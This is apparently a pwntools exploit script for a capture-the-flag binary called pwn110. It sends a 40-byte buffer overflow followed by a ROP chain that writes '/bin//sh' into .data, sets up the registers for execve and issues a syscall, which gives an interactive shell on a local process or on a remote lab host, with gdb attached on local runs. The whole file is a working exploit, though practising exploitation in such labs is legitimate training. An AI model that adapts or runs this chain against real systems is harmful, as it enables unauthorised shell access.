from pwn import *

context.arch = "amd64"
context.log_level = 'info'

BINARY = './pwn110-1644300525386.pwn110'
HOST = '10.128.131.51'
PORT = 9010

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process(BINARY)

OFFSET = 40

payload = flat(
    b'A' * OFFSET,
    0x40f4de, # pop rsi ; ret
    0x4c00e0, # @ .data
    0x4497d7, # pop rax ; ret
    b'/bin//sh',
    0x47bcf5, # mov qword ptr [rsi], rax ; ret
    0x40f4de, # pop rsi ; ret
    0x4c00e8, # @ .data + 8
    0x443e30, # xor rax, rax ; ret
    0x47bcf5, # mov qword ptr [rsi], rax ; ret
    0x40191a, # pop rdi ; ret
    0x4c00e0, # @ .data
    0x40f4de, # pop rsi ; ret
    0x4c00e8, # @ .data + 8
    0x40181f, # pop rdx ; ret
    0x4c00e8, # @ .data + 8
    0x443e30, # xor rax, rax ; ret
    *([0x470d20] * 59), # add rax, 1 ; ret (59 fois)
    0x4012d3, # syscall
)

# Attache GDB avant l'envoi (uniquement en local)
if not args.REMOTE:
    gdb.attach(p, '''
    break *0x4012d3
    continue
    ''')

p.clean()
p.sendline(payload)
p.interactive()
